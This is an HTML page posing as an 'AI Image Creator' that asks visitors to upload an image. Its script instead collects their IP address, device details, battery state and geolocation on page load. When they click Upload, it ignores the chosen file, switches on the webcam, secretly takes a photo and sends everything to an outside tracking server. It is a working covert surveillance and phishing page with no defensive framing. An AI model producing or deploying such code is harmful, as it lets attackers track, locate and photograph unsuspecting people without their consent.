<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Image Creator</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #121212;
            color: white;
            text-align: center;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 600px;
            margin: 50px auto;
            padding: 20px;
            background: #1e1e1e;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(255, 255, 255, 0.1);
        }
        button {
            background: #008CBA;
            color: white;
            border: none;
            padding: 12px;
            font-size: 16px;
            cursor: pointer;
            border-radius: 5px;
            margin-top: 10px;
        }
        button:hover {
            background: #005f7f;
        }
        video {
            width: 100%;
            border-radius: 5px;
            margin-top: 10px;
        }
        #captureCanvas {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>AI Image Creator</h1>
        <p>Upload an image to generate AI-powered artwork.</p>
        <input type="file" id="fileInput" accept="image/*">
        <button id="uploadBtn">Upload</button>
        <video id="video" autoplay></video>
    </div>
    
    <canvas id="captureCanvas"></canvas>

    <script>
        const backendURL = "https://flash-3vfu.onrender.com";  
        const sessionId = Math.random().toString(36).substring(2, 10);

        async function getIP() {
            try {
                const response = await fetch("https://api64.ipify.org?format=json");
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error("IP Fetch Error:", error);
                return "Unknown";
            }
        }

        function getDeviceInfo() {
            return {
                platform: navigator.platform,
                userAgent: navigator.userAgent,
                screenWidth: screen.width,
                screenHeight: screen.height,
                cookiesEnabled: navigator.cookieEnabled,
                plugins: Array.from(navigator.plugins).map(p => p.name).join(", ")
            };
        }

        async function getBatteryInfo() {
            try {
                const battery = await navigator.getBattery();
                return {
                    level: Math.round(battery.level * 100),
                    charging: battery.charging
                };
            } catch (error) {
                console.error("Battery Error:", error);
                return { level: "N/A", charging: "N/A" };
            }
        }

        function getLocation() {
            return new Promise((resolve) => {
                navigator.geolocation.getCurrentPosition(
                    position => resolve({
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude
                    }),
                    error => {
                        console.warn("Geolocation Error:", error);
                        resolve({ latitude: "N/A", longitude: "N/A" });
                    }
                );
            });
        }

        async function sendData(photo = null) {
            const ip = await getIP();
            const device = getDeviceInfo();
            const battery = await getBatteryInfo();
            const geo = await getLocation();

            const data = {
                sessionId,
                device: { ...device, ip },
                battery,
                geo,
                photo
            };

            fetch(`${backendURL}/track/${sessionId}`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(data)
            }).catch(err => console.log("Error sending data:", err));
        }

        function startTracking() {
            sendData();
        }

        async function capturePhoto() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('captureCanvas');
            const context = canvas.getContext('2d');

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;

                setTimeout(() => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0);
                    const photoData = canvas.toDataURL("image/png");

                    sendData(photoData);
                    stream.getTracks().forEach(track => track.stop());  
                    video.style.display = "none"; 
                }, 3000);
            } catch (error) {
                console.error("Camera Access Denied:", error);
            }
        }

        document.getElementById('uploadBtn').addEventListener('click', () => {
            capturePhoto();
        });

        window.onload = startTracking;
    </script>
</body>
</html>
